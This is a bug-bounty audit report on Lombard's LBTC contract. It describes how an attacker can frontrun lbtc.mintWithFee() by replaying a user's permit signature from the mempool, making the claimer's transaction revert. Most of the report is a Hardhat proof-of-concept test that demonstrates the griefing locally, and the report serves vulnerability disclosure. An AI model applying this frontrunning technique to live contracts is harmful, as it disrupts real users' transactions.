# #38189 \[SC-Insight] Attacker can grief calls to \`lbtc.mintWithFee()\`

**Submitted on Dec 27th 2024 at 10:51:08 UTC by @Shahen for** [**Audit Comp | Lombard**](https://immunefi.com/audit-competition/audit-comp-lombard)

* **Report ID:** #38189
* **Report Type:** Smart Contract
* **Report severity:** Insight
* **Target:** <https://github.com/lombard-finance/evm-smart-contracts/blob/main/contracts/LBTC/LBTC.sol>
* **Impacts:**
  * Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol (not lower than $1K))

## Description

## Brief/Intro

When the claimer calls `lbtc.mintWithFee()`, The claimer calls `lbtc.permit()` firstly with the user signature to give approval, So an malicious actor that monitors the mempool can frontrun the call to `lbtc.mintWithFee()` with `lbtc.permit()` with the users signature taken from the pending transaction. Now when the call gets mined it reverts as the permit is already been used. All calls directly to `lbtc.mintWithFee()` can be griefed this way.

Make a test file under test, And paste the coded poc below,And run `yarn hardhat test test/testfile.ts` For the test im calling directly from the `stakeAndBake` contract which is the `claimer`

## Vulnerability Details

Same as above Brief/Intro

## Impact Details

All calls to `lbtc.mintWithFee()` can be griefed by an attacker by frontrunning and calling `lbtc.permit()`

## References

<https://github.com/lombard-finance/evm-smart-contracts/blob/a818ea0489178ccd00019edab24637c38501af7b/contracts/LBTC/LBTC.sol#L415>

## Proof of Concept

## Proof of Concept

```
import { ethers } from 'hardhat';
import { expect } from 'chai';
import { takeSnapshot } from '@nomicfoundation/hardhat-toolbox/network-helpers';
import {
    deployContract,
    getSignersWithPrivateKeys,
    CHAIN_ID,
    getFeeTypedMessage,
    generatePermitSignature,
    NEW_VALSET,
    DEPOSIT_BTC_ACTION,
    encode,
    getPayloadForAction,
    signDepositBtcPayload,
    Signer,
    init,
} from './helpers';
import {
    StakeAndBake,
    BoringVaultDepositor,
    LBTCMock,
    BoringVaultMock,
    AccountantMock,
    TellerMock,
} from '../typechain-types';
import { SnapshotRestorer } from '@nomicfoundation/hardhat-network-helpers/src/helpers/takeSnapshot';

describe('lbtc.mintWithFee() griefing Test', function () {
    let deployer: Signer,
        signer1: Signer,
        signer2: Signer,
        signer3: Signer,
        treasury: Signer;
    let stakeAndBake: StakeAndBake;
    let tellerWithMultiAssetSupportDepositor: TellerWithMultiAssetSupportDepositor;
    let teller: TellerWithMultiAssetSupportMock;
    let lbtc: LBTCMock;
    let snapshot: SnapshotRestorer;
    let snapshotTimestamp: number;

    before(async function () {
        [deployer, signer1, signer2, signer3, treasury] =
            await getSignersWithPrivateKeys();

        const burnCommission = 1000;
        const result = await init(
            burnCommission,
            treasury.address,
            deployer.address
        );
        lbtc = result.lbtc;

        stakeAndBake = await deployContract<StakeAndBake>('StakeAndBake', [
            await lbtc.getAddress(),
            deployer.address,
        ]);

        teller = await deployContract<TellerWithMultiAssetSupportMock>(
            'TellerWithMultiAssetSupportMock',
            [],
            false
        );

        tellerWithMultiAssetSupportDepositor =
            await deployContract<TellerWithMultiAssetSupportDepositor>(
                'TellerWithMultiAssetSupportDepositor',
                [],
                false
            );

        // mock minter for lbtc
        await lbtc.addMinter(deployer.address);

        // set stake and bake as claimer for lbtc
        await lbtc.addClaimer(await stakeAndBake.getAddress());

        // set deployer as operator
        await lbtc.transferOperatorRole(deployer.address);

        // Initialize the permit module
        await lbtc.reinitialize();

        // Add BoringVaultDepositor as a depositor on the StakeAndBake contract
        await expect(
            stakeAndBake.addDepositor(
                await teller.getAddress(),
                await tellerWithMultiAssetSupportDepositor.getAddress()
            )
        )
            .to.emit(stakeAndBake, 'DepositorAdded')
            .withArgs(
                await teller.getAddress(),
                await tellerWithMultiAssetSupportDepositor.getAddress()
            );

        snapshot = await takeSnapshot();
        snapshotTimestamp = (await ethers.provider.getBlock('latest'))!
            .timestamp;
    });

    afterEach(async function () {
        // clean the state after each test
        await snapshot.restore();
    });

    describe('Setup()', function () {
        let data;
        let permitPayload;
        let depositPayload;
        let approval;
        let userSignature;
        const value = 10001;
        const fee = 1;
        const depositValue = 5000;

        before(async function () {
            data = await signDepositBtcPayload(
                [signer1],
                [true],
                CHAIN_ID,
                signer2.address,
                value,
                encode(['uint256'], [0]) // txid
            );
            userSignature = await getFeeTypedMessage(
                signer2,
                await lbtc.getAddress(),
                fee,
                snapshotTimestamp + 100
            );

            // set max fee
            await lbtc.setMintFee(fee);

            approval = getPayloadForAction(
                [fee, snapshotTimestamp + 100],
                'feeApproval'
            );

            // create permit payload
            const block = await ethers.provider.getBlock('latest');
            const timestamp = block!.timestamp;
            const deadline = timestamp + 100;
            const chainId = (await ethers.provider.getNetwork()).chainId;
            const { v, r, s } = await generatePermitSignature(
                lbtc,
                signer2,
                await tellerWithMultiAssetSupportDepositor.getAddress(),
                depositValue,
                deadline,
                chainId,
                0
            );

            permitPayload = encode(
                ['uint256', 'uint256', 'uint8', 'uint256', 'uint256'],
                [depositValue, deadline, v, r, s]
            );

            // make a deposit payload for the boringvault
            depositPayload = encode(
                ['address', 'uint256'],
                [await lbtc.getAddress(), depositValue]
            );
        });

        it('Frontrun attack leading to griefing calls to lbtc.mintWithFee()', async function () {
            const block = await ethers.provider.getBlock('latest');
            const timestamp = block!.timestamp;
            const deadline = timestamp + 100;
            const chainId = (await ethers.provider.getNetwork()).chainId;
            const { v, r, s } = await generatePermitSignature(
                lbtc,
                signer2,
                await tellerWithMultiAssetSupportDepositor.getAddress(),
                depositValue,
                deadline,
                chainId,
                0
            );


        //1. Attacker Frontruns the call to `lbtc.mintWithFee()` by claimer by calling `lbtc.permit()` with the signature    
            await lbtc.permit(
                signer2.address,
                tellerWithMultiAssetSupportDepositor.getAddress(),
                depositValue,
                deadline,
                v,
                r,
                s
            );

        //2. Now since the attacker called `lbtc.permit()`, claimers call to `lbtc.mintWithFee()` reverts with error `invalid-signature`

            await expect(
                stakeAndBake.stakeAndBake({
                    vault: await teller.getAddress(),
                    owner: signer2.address,
                    permitPayload: permitPayload,
                    depositPayload: depositPayload,
                    mintPayload: data.payload,
                    proof: data.proof,
                    feePayload: approval,
                    userSignature: userSignature,
                })
            ).to.be.reverted;
        });
        
    });
});

```
